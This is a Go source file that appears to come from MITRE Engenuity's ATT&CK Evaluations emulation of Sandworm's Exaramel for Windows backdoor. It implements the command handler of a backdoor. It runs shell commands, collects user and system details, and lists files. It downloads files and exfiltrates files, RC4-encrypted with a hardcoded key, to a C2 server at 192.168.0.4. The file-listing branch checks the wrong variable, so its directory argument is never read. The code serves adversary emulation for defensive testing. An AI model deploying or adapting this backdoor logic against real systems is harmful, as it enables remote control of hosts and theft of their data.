package taskhandler

import (
	"errors"
	"path/filepath"
	"strings"

	"attackevals.mitre-engenuity.org/exaramel-windows/discovery"
	"attackevals.mitre-engenuity.org/exaramel-windows/encrypt"
	"attackevals.mitre-engenuity.org/exaramel-windows/execute"
	"attackevals.mitre-engenuity.org/exaramel-windows/files"
)

func HandleTask(task string) ([]byte, error) {

	// handle shell commands
	if strings.Contains(task, "exec-cmd") {
		t := execute.ParseExecCmd(task)
		output, err := execute.ExecShellCommand(t)
		if err != nil {
			return nil, err
		}
		return output, err
	}

	// run shell commands in the background
	if strings.Contains(task, "exec-background") {
		t := task[16:]
		go execute.ExecBackgroundCommand(t)
		s := "Executing background command: " + t
		output := []byte(s)
		return output, nil
	}

	// Sandworm Team has collected the username from a compromised host.[1]
	if strings.Contains(task, "get-user") {

		currentUser, err := discovery.GetCurrentUserName()
		if err != nil {
			return nil, err
		}
		return []byte(currentUser), err
	}

	// Sandworm Team used a backdoor to enumerate information about the infected system's operating system.[12][1]
	if strings.Contains(task, "get-sysinfo") {
		sysInfo, err := discovery.GetOSInfo()
		if err != nil {
			return nil, err
		}
		return []byte(sysInfo), err
	}

	// Sandworm Team has enumerated files on a compromised host.[1]
	if strings.Contains(task, "enum-files") {

		// parse target directory from task string
		filesToEnum := "."
		if len(filesToEnum) > 11 {
			filesToEnum = task[11:]
		}

		fileList, err := files.ListFilesRecursive(filesToEnum)
		if err != nil {
			return nil, err
		}
		return []byte(fileList), err
	}

	// download file via HTTP/HTTPS
	if strings.Contains(task, "get-file") {
		url := ""
		dstFile := ""

		// get URL and destination file
		var s string
		var t []string
		if len(task) > 9 {
			s = task[9:]
			t = strings.Split(s, " ")
		}
		url = t[0]
		dstFile = t[1]

		// download the file
		result, err := files.GetFileFromServer(url, dstFile)
		if err != nil {
			return nil, err
		}
		return []byte(result), err
	}

	// upload file via HTTP/HTTPS
	if strings.Contains(task, "put-file") {
		// Exaramel for Windows specifies a path to store files scheduled for exfiltration.[1]
		fileToUpload := task[9:]
		fileData, err := files.ReadFile(fileToUpload)
		if err != nil {
			return nil, err
		}
		// Exaramel for Windows automatically encrypts files before sending them to the C2 server.[1]
		key := []byte("s0m3t3rr0r") // key taken from https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/
		rc4EncryptedFileData, err := encrypt.CryptRC4(key, fileData)
		if err != nil {
			return nil, err
		}

		fileName := filepath.Base(fileToUpload)
		url := "https://192.168.0.4/putFile/" + fileName

		result, err := files.PostFileToServer(url, rc4EncryptedFileData)
		if err != nil {
			return nil, err
		}
		return []byte(result), err

	}

	e := "unsupported command: " + task
	return nil, errors.New(e)
}
